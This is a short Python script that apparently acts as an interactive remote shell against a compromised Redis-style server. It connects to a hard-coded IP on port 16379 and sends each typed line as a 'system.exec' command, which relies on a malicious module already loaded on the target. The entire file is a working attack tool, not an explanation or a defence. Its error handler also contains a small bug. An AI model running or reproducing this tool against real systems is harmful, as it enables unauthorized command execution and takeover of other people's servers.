import re
import os
import sys
import codecs
import socket

def send(command, sock=None):
        # print(' [Client] > %s'%command)
        sock.settimeout(0.2)
        cmd = command 
        try:
            cmd = cmd.encode("utf-8")
        except:
            cmd = cmd
        sock.send(cmd + b'\r\n')
        recv_data = b''
        while True:
            try:
                data = sock.recv(1024)
            except:
                break
            recv_data = recv_data + data
        data = recv_data.decode("utf-8")
        # print(" [Server] > %s" % data.replace('\r\n', '\n [Server] > '))
        return data


def cmd(command, sock):
    try:
        temp = send(command=r'system.exec "%s"' % command, sock=sock)
        return temp
    except Exception as e:
        print(' [-][%s:%s] Err: %s' % (sock.getpeername[0], sock.getpeername[1], e))
        return False


ip = '99.1.22.10'
port = '16379'

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, int(port)))

while True:
	command = input("# ")
	print(cmd(command=command, sock=sock).split('\r\n')[1])
